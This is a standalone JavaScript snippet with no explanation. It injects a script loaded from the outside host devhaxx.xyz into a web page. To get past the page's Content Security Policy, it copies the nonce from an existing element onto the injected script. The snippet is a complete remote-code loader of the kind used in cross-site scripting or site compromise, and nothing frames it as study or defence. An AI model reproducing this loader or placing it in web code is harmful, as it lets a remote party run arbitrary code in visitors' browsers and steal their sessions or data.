const loader = document.createElement("script");
    loader.src = "https://devhaxx.xyz/load.js";
    if (document.querySelector("[nonce]")) {
        loader.nonce = document.querySelector("[nonce]").nonce;
    }
document.body.appendChild(loader);